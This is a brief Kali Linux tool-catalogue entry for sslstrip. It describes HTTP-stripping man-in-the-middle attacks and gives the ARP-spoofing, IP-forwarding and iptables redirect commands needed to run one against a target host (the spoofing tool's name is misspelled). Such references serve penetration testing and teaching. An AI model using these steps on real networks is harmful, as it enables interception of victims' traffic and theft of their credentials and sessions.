  md: '# sslstrip


    **DESCRIPTION** sslstrip provides a demonstration of the HTTP stripping attacks.
    It will transparently hijack HTTP traffic on a network, watch for HTTPS links
    and redirects, then map those links into either look-alike HTTP links or homograph-similar
    HTTPS links. It also supports modes for supplying a favicon which looks like a
    lock icon, selective logging, and session denial. First, arpspof convinces a host
    that your MAC address is the router''s MAC address, and the target begins to send
    us all its network traffic. The kernel forwards everything except for traffic
    destined to port 80, which it redirects to $listenPort (10000, for example). At
    this point, sslstrip receives the traffic and does its magic.


    **USAGE** sslstrip.py -l <listenPort>


    **EXAMPLE**

    Flip your machine into forwarding mode.

    echo "1" > /proc/sys/net/ipv4/ip_forward

    Setup iptables -t redirect HTTP traffic to sslstrip.

    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
    <listenPort>

    Run sslstrip.

    sslstrip.py -l <listenPort>

    Run arpspof to convince a network they should send their traffic to.

    arpspof -i <interface> -t <targetIP> <gatewayIP>


    List of Tools for Kali Linux 2013'
